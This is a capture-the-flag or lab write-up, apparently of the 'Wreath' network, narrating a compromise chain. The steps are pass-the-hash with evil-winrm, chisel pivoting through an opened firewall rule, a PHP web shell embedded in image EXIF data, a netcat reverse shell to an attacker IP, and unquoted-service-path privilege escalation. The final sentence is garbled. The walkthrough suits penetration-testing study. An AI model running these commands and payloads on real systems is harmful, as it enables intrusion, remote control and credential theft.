With Administrator's hash from git-serv, I used `evil-winrm` to get a shell and enumerate `10.200.177.100`

```
evil-winrm -i git-serv -u Administrator -H HASH -s /usr/share/powershell-empire/data/module_source/situational_awareness/network
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.177.100 -TopPorts 50
Hostname      : 10.200.177.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 5900, 993...}

```

For pivoting, a hole was opened in the firewall in `10.200.177.150` and `chisel` was used.

```
# 10.200.177.150
netsh advfirewall firewall add rule name="chisel-chocola" dir=in action=allow protocol=tcp localport=17171
./chisel-chocola.exe server -p 17171 --socks5

# attacker
chisel client git-serv:17171 9090:socks
```

Visiting the page `/resources/index.php` found in the source code from git-serv, we're met with a basic auth prompt. Thomas' credentials, previously found using mimikatz and cracked can be used to log in.

The website running on port 80 is most likely a mirror of the site whose source code we have from `git-serv`, albeit possibly a different version. Knowing this, we can abuse `/resources/index.php` to upload a malicious PHP file to get code execution. To craft the malicious file, we simply need to create an image file, put PHP code in its EXIF data, and have one of the allowed file extensions as  its 2nd extension. A PoC image is created as follows:

```sh
exiftool -Comment='<?php system($_GET["cmd"]);?>' chocola.png.php
```

With the file uploaded, we can go to `/resources/uploads/chocola.png.php?cmd=COMMAND` and get code execution. With this, we can then upload a binary of `nc.exe` and get a reverse shell.

```
http://10.200.177.100/resources/uploads/chocola.png.php?wreath=powershell.exe%20c:\\windows\\temp\\nc-chocola.exe%2010.50.174.9%201337%20-e%20cmd.exe
```

Looking at services, we see the service "SystemExplorerHelpService" has an unquoted path, and is thus vulnerable to the "Unquoted Service Path" exploit.

The service is run as local admin

We as Thomas in the group `BUILTIN\Users Allow` as Full Control access to the directory `C:\program files (x86)\system explorer`

With our malicious program copied to `C:\Program Files (x86)\System Explorer\System.exe`, we're able to stop and start the service `SystemExplorerHelpService` and get a shell as `nt authority\system` on `wreath-pc`.

With root access, we the exfiltrated password hashes
